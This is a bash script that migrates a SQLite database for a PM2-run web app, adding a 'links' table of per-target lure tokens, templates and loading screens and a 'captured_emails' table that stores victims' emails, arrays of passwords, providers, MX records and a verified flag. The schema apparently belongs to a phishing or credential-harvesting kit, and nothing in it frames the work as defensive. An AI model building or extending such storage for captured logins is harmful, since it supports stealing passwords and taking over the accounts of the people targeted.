#!/bin/bash
# ============================================
# 🔧 DATABASE MIGRATION: Add links and captured_emails Tables
# ============================================

set -e

PROJECT_DIR="/root/page"
if [ ! -d "$PROJECT_DIR" ]; then
    PROJECT_DIR=$(pwd)
fi

DB_FILE="$PROJECT_DIR/data/fox_secure.db"
STANDALONE_DB_FILE="$PROJECT_DIR/.next/standalone/data/fox_secure.db"

echo "🔧 Database Migration: Adding links and captured_emails tables"

migrate_db() {
    local db_path="$1"
    local db_name="$2"
    
    if [ ! -f "$db_path" ]; then
        echo "ℹ️  $db_name database not found at $db_path (skipping)"
        return
    fi
    
    echo "📦 Migrating $db_name database..."
    
    sqlite3 "$db_path" <<EOF
-- Links Table
CREATE TABLE IF NOT EXISTS links (
    id TEXT PRIMARY KEY,
    type TEXT NOT NULL,
    sessionIdentifier TEXT UNIQUE,
    linkToken TEXT,
    name TEXT,
    createdAt INTEGER,
    expiresAt INTEGER,
    status TEXT,
    templateId TEXT,
    templateMode TEXT,
    language TEXT,
    loadingScreen TEXT,
    loadingDuration INTEGER,
    
    -- Type A fields
    email TEXT,
    used INTEGER DEFAULT 0,
    usedAt INTEGER,
    fingerprint TEXT,
    ip TEXT,
    
    -- Type B fields
    allowedEmails TEXT, -- JSON array
    validatedAccounts TEXT, -- JSON array
    pendingEmails TEXT, -- JSON array
    totalEmails INTEGER,
    capturedCount INTEGER,
    pendingCount INTEGER,
    
    link_format TEXT DEFAULT 'A'
);

CREATE INDEX IF NOT EXISTS idx_links_sessionIdentifier ON links(sessionIdentifier);
CREATE INDEX IF NOT EXISTS idx_links_linkToken ON links(linkToken);

-- Captured Emails Table
CREATE TABLE IF NOT EXISTS captured_emails (
    id TEXT PRIMARY KEY,
    email TEXT NOT NULL,
    sessionIdentifier TEXT,
    linkToken TEXT,
    linkType TEXT,
    linkName TEXT,
    fingerprint TEXT,
    ip TEXT,
    passwords TEXT, -- JSON array
    verified INTEGER DEFAULT 0,
    provider TEXT,
    capturedAt INTEGER,
    attempts INTEGER,
    mxRecord TEXT
);

CREATE INDEX IF NOT EXISTS idx_captured_emails_email ON captured_emails(email);
CREATE INDEX IF NOT EXISTS idx_captured_emails_sessionIdentifier ON captured_emails(sessionIdentifier);
EOF
    
    echo "✅ $db_name database migration successful!"
}

# Stop PM2
if command -v pm2 &> /dev/null; then
    pm2 stop page || true
fi

migrate_db "$DB_FILE" "Main"
migrate_db "$STANDALONE_DB_FILE" "Standalone"

# Restart PM2
if command -v pm2 &> /dev/null; then
    pm2 restart page --update-env || pm2 start page --update-env
fi

echo "🎉 Migration complete!"
